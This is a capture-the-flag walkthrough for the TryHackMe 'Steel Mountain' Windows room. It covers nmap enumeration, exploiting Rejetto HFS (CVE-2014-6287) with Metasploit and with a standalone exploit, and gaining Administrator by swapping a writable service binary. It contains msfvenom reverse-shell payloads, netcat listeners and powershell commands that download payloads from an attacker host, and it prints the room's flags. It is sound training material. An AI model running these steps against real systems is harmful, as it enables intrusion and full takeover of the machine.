# Steel Mountain

https://tryhackme.com/room/steelmountain

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

# F3d3r!c0 | Nov 20th, 2020
_________________________________________________________

# [Task 1] Introduction
In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our Kali Room.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
_________________________________________________________

Deploy the machine.

Who is the employee of the month?

    $ nmap -sV -vv --script vuln <victim_ip>
    Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-20 17:19 CET
    NSE: Loaded 149 scripts for scanning.
    NSE: Script Pre-scanning.
    NSE: Starting runlevel 1 (of 2) scan.
    Initiating NSE at 17:19
    Completed NSE at 17:20, 10.00s elapsed
    NSE: Starting runlevel 2 (of 2) scan.
    Initiating NSE at 17:20
    Completed NSE at 17:20, 0.00s elapsed
    Initiating Ping Scan at 17:20
    Scanning <victim_ip> [2 ports]
    Completed Ping Scan at 17:20, 0.06s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 17:20
    Completed Parallel DNS resolution of 1 host. at 17:20, 0.03s elapsed
    Initiating Connect Scan at 17:20
    Scanning <victim_ip> [1000 ports]
    Discovered open port 3389/tcp on <victim_ip>
    Discovered open port 8080/tcp on <victim_ip>
    Discovered open port 135/tcp on <victim_ip>
    Discovered open port 445/tcp on <victim_ip>
    Discovered open port 139/tcp on <victim_ip>
    Discovered open port 80/tcp on <victim_ip>
    Discovered open port 49154/tcp on <victim_ip>
    Discovered open port 49155/tcp on <victim_ip>
    Discovered open port 49163/tcp on <victim_ip>
    Discovered open port 49153/tcp on <victim_ip>
    Discovered open port 49152/tcp on <victim_ip>
    Discovered open port 49157/tcp on <victim_ip>
    Completed Connect Scan at 17:20, 1.01s elapsed (1000 total ports)
    Initiating Service scan at 17:20
    Scanning 12 services on <victim_ip>
    Service scan Timing: About 58.33% done; ETC: 17:21 (0:00:39 remaining)
    Completed Service scan at 17:21, 59.54s elapsed (12 services on 1 host)
    NSE: Script scanning <victim_ip>.
    NSE: Starting runlevel 1 (of 2) scan.
    Initiating NSE at 17:21
    NSE: [firewall-bypass <victim_ip>] lacks privileges.
    NSE Timing: About 99.34% done; ETC: 17:21 (0:00:00 remaining)
    NSE Timing: About 99.47% done; ETC: 17:22 (0:00:00 remaining)
    NSE Timing: About 99.67% done; ETC: 17:22 (0:00:00 remaining)
    NSE Timing: About 99.67% done; ETC: 17:23 (0:00:00 remaining)
    NSE Timing: About 99.87% done; ETC: 17:23 (0:00:00 remaining)
    NSE Timing: About 99.87% done; ETC: 17:24 (0:00:00 remaining)
    NSE Timing: About 99.87% done; ETC: 17:24 (0:00:00 remaining)
    NSE Timing: About 99.93% done; ETC: 17:25 (0:00:00 remaining)
    NSE Timing: About 99.93% done; ETC: 17:25 (0:00:00 remaining)
    NSE Timing: About 99.93% done; ETC: 17:26 (0:00:00 remaining)
    NSE Timing: About 99.93% done; ETC: 17:26 (0:00:00 remaining)
    Completed NSE at 17:26, 339.69s elapsed
    NSE: Starting runlevel 2 (of 2) scan.
    Initiating NSE at 17:26
    NSE: [tls-ticketbleed <victim_ip>:3389] Not running due to lack of privileges.
    Completed NSE at 17:26, 1.90s elapsed
    Nmap scan report for <victim_ip>
    Host is up, received syn-ack (0.059s latency).
    Scanned at 2020-11-20 17:20:06 CET for 403s
    Not shown: 988 closed ports
    Reason: 988 conn-refused
    PORT      STATE SERVICE            REASON  VERSION
    80/tcp    open  http               syn-ack Microsoft IIS httpd 8.5
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-jsonp-detection: Couldn't find any JSONP endpoints.
    |_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
    |_http-server-header: Microsoft-IIS/8.5
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
    |_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
    135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
    139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
    3389/tcp  open  ssl/ms-wbt-server? syn-ack
    | ssl-dh-params:
    |   VULNERABLE:
    |   Diffie-Hellman Key Exchange Insufficient Group Strength
    |     State: VULNERABLE
    |       Transport Layer Security (TLS) services that use Diffie-Hellman groups
    |       of insufficient strength, especially those using one of a few commonly
    |       shared groups, may be susceptible to passive eavesdropping attacks.
    |     Check results:
    |       WEAK DH GROUP 1
    |             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
    |             Modulus Type: Safe prime
    |             Modulus Source: RFC2409/Oakley Group 2
    |             Modulus Length: 1024
    |             Generator Length: 1024
    |             Public Key Length: 1024
    |     References:
    |_      https://weakdh.org
    |_sslv2-drown:
    8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-fileupload-exploiter:
    |   
    |_    Couldn't find a file-type field.
    |_http-jsonp-detection: Couldn't find any JSONP endpoints.
    |_http-litespeed-sourcecode-download: Page: /index.php was not found. Try with an existing file.
    | http-method-tamper:
    |   VULNERABLE:
    |   Authentication bypass by HTTP verb tampering
    |     State: VULNERABLE (Exploitable)
    |       This web server contains password protected resources vulnerable to authentication bypass
    |       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
    |        common HTTP methods and in misconfigured .htaccess files.
    |              
    |     Extra information:
    |       
    |   URIs suspected to be vulnerable to HTTP verb tampering:
    |     /~login [GENERIC]
    |   
    |     References:
    |       http://www.mkit.com.ar/labs/htexploit/
    |       http://www.imperva.com/resources/glossary/http_verb_tampering.html
    |       http://capec.mitre.org/data/definitions/274.html
    |_      https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
    |_http-server-header: HFS 2.3
    | http-slowloris-check:
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       http://ha.ckers.org/slowloris/
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-vuln-cve2011-3192:
    |   VULNERABLE:
    |   Apache byterange filter DoS
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2011-3192  BID:49303
    |       The Apache web server is vulnerable to a denial of service attack when numerous
    |       overlapping byte ranges are requested.
    |     Disclosure date: 2011-08-19
    |     References:
    |       https://seclists.org/fulldisclosure/2011/Aug/175
    |       https://www.tenable.com/plugins/nessus/55976
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    |_      https://www.securityfocus.com/bid/49303
    |_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
    49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
    49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
    49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
    49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
    49157/tcp open  msrpc              syn-ack Microsoft Windows RPC
    49163/tcp open  msrpc              syn-ack Microsoft Windows RPC
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
    Host script results:
    |_samba-vuln-cve-2012-1182: No accounts left to try
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: No accounts left to try
    NSE: Script Post-scanning.
    NSE: Starting runlevel 1 (of 2) scan.
    Initiating NSE at 17:26
    Completed NSE at 17:26, 0.00s elapsed
    NSE: Starting runlevel 2 (of 2) scan.
    Initiating NSE at 17:26
    Completed NSE at 17:26, 0.00s elapsed
    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 412.74 seconds

    http://<victim_ip>:80
    <img src="/img/BillHarper.png" style="width:200px;height:200px;">

**Answer: Bill Harper**

# [Task 2] Initial Access
Now you have deployed the machine, lets get an initial shell!
_________________________________________________________

Scan the machine with nmap. What is the other port running a web server on?

**Answer: 8080**

Take a look at the other web server. What file server is running?

    http://<victim_ip>:8080

**Answer: rejetto Http File Server**

What is the CVE number to exploit this file server?


    https://www.exploit-db.com/exploits/39161
**Answer: 2014-6287**

Use Metasploit to get an initial shell. What is the user flag?

    $sudo msfdb init
    $msfconsole

    msf6 > search 2014-6287
  
    Matching Modules
    ================
  
     #  Name                                   Disclosure Date  Rank       Check  Description
     -  ----                                   ---------------  ----       -----  -----------
     0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
  

    Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

    msf6 > use 0
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    msf6 exploit(windows/http/rejetto_hfs_exec) >

**Answer: 04763b6fcf51fcd7c13abc7db4fd365**

# [Task 3] Privilege Escalation
Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!
_________________________________________________________

To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

You can download the script [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). Now you can use the upload command in Metasploit to upload the script.

![Meterpreter](https://i.imgur.com/Zqipdba.png)

To execute this using Meterpreter, I will type **load powershell** into meterpreter. Then I will enter powershell by entering **powershell_shell**:

![alt text](https://i.imgur.com/1IEi13Y.png)
**Answer: No answer need**

Take close attention to the CanRestart option that is set to true. What is the name of the name of the service which shows up as an unquoted service path vulnerability?

Upload Script

    upload <path>
  
    ls
  
    load powershell
    powershell_shell

    . .\Powerup.ps1
    Invoke-Allchecks
**Answer: AdvancedSystemCareService9**

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as an Windows executable.
![alt text](https://i.imgur.com/ieeJUME.png)
Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

**Note:** The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.

Let’s note the path first

    C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe

Use msfvenom to generate a reverse shell as an Windows executable.

    msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker port> -e x86/shikata_ga_nai -f exe -o ASCService.exe

Back to metasploit, create listening session

    use multi/handler
    set LHOST <attacker_ip>
    set LPORT <attacker port>

**Answer: No answer need**

What is the root flag?
  
    cd /Users/Administrator/Desktop
    dir
    type root.txt
**Answer: 9af5f314f57607c00fd09803a587db80**

# [Task 4] Access and Escalation Without Metasploit
Now let's complete the room without the use of Metasploit.

For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to
_________________________________________________________
To begin we shall be using the same CVE. However, this time let's use this [exploit](https://www.exploit-db.com/exploits/39161).

*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*


To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from [GitHub](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)!

You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!

1. Save script from https://www.exploit-db.com/exploits/39161
2. Edit local IP and port

        ip_addr = "192.168.44.128" #local IP address
        local_port = "443" # Local Port number

        ip_addr = "<attacker_ip>" #local IP address
        local_port = "4444" # Local Port number

3. Create HTTP Server

        $python -m SimpleHTTPServer 80  

4. Create listener

        $nc -lvp 4444

5. Run the exploit

        $python rejetto.py <victim_ip> 8080

6. Let’s see at HTTP Server

        Serving HTTP on 0.0.0.0 port 80 ...
        <attacker_ip> - - [23/Nov/2020 11:21:52] code 404, message File not found
        <attacker_ip> - - [23/Nov/2020 11:21:52] "GET /nc.exe HTTP/1.1" 404 -
        <attacker_ip> - - [23/Nov/2020 11:21:52] code 404, message File not found
        <attacker_ip> - - [23/Nov/2020 11:21:52] "GET /nc.exe HTTP/1.1" 404 -
        <attacker_ip> - - [23/Nov/2020 11:21:52] code 404, message File not found
        <attacker_ip> - - [23/Nov/2020 11:21:52] "GET /nc.exe HTTP/1.1" 404 -
        <attacker_ip> - - [23/Nov/2020 11:21:52] code 404, message File not found
        <attacker_ip> - - [23/Nov/2020 11:21:52] "GET /nc.exe HTTP/1.1" 404 -

7. Edit ncat.exe to nc.exe

        $mv ncat.exe nc.exe

8. Run python command again

        $python rejetto.py <victim_ip> 8080

9. Back to listener, now I have shell

**Answer: No answer need**

Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c.

Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.
![ASCService](https://i.imgur.com/OyEdJ27.png)

What powershell -c command could we run to manually find out the service name?

*Format is "powershell -c "command here"*

1. Check for system version

        systeminfo

2. Get winPEAS

        powershell -c "Invoke-WebRequest -OutFile winPEAS.exe http://<attacker_ip>/winPEAS.exe"



**Answer: powershell -c "Get-Service"**

Now let's escalate to Administrator with our new found knowledge.

Generate your payload using msfvenom and pull it to the system using powershell.


Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.

First we need to stop the service which we can do like so;

sc stop AdvancedSystemCareService9

Shortly followed by;

sc start AdvancedSystemCareService9

Once this command runs, you will see you gain a shell as Administrator on our listener!


#Exploitation

1. Go to the path

        cd \Program Files (x86)\IObit\Advanced SystemCare

Back to attacker’s machine, create msfvenom payload
Reference: https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/

    msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=1234 -f exe -o ASCService.exe

2. Create listener on port 1234

        nc -lvp 1234

Back to victim’s machine, stop service

    sc stop AdvancedSystemCareService9

3. Backup ASCService.exe

        rename ASCService.exe ASCService_bak.exe

4. Download our payload

        powershell -c "Invoke-WebRequest -OutFile ASCService.exe http://<attacker_ip>/ASCService.exe"

5. Start service

        sc start AdvancedSystemCareService9

Now I have shell.

**Answer: No answer need**
